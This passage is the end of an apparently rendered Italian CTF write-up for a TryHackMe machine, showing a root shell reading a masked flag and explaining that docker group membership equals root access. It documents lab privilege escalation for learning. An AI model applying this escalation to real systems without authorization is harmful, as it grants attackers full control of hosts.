+</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5"></a><span class="c1"># ls</span>
+</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6"></a>root.txt
+</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7"></a><span class="c1"># cat root.txt</span>
+</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8"></a>THM<span class="o">{</span>*******************************<span class="o">}</span>
+</span><span id="__span-9-9"><a id="__codelineno-9-9" name="__codelineno-9-9"></a><span class="c1"># </span>
+</span></code></pre></div></td></tr></table></div>
+<p>Questo è stato reso possibile poichè essere nel gruppo <code>docker</code> è equivalente a privilegi di root, poichè usare il daemon Docker è un Deamon privilegiato che tipicamente è eseguito da <code>root</code> .</p>
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.tracking", "navigation.sections", "navigation.expand", "navigation.top", "search.suggest", "search.highlight", "search.share", "content.code.copy", "content.code.annotate"], "search": "../../assets/javascripts/workers/search.a7633da7.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.c21346df.min.js"></script>
+      
+    
+  </body>
+</html>
